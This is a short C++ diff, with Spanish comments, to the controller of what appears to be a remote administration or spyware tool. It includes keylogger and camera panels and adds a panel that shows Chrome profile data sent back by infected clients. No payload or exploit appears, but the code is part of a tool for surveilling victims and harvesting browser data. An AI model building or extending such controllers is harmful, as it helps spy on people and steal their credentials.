@@ -11,6 +11,7 @@
 #include "panel_keylogger.hpp"
 #include "panel_camara.hpp"
 #include "panel_wmanager.hpp"
+#include "panel_info_chrome.hpp"
 #include "file_editor.hpp"
 
 //Definir el servidor globalmente
@@ -490,7 +491,13 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
 
     //mod informacion - Lista perfiles chrome
     if (iComando == EnumComandos::INF_Chrome_Profiles_Out) {
-        DEBUG_MSG(paquete.cBuffer.data());
+        if (this->m_isFrameVisible()) {
+            panelInfoChrome* temp_pn = (panelInfoChrome*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Info, this->n_Frame);
+            if (temp_pn) {
+                std::string strData(paquete.cBuffer.data());
+                temp_pn->m_AgregarDataPerfiles(strData);
+            }
+        }
         return;
     }
 
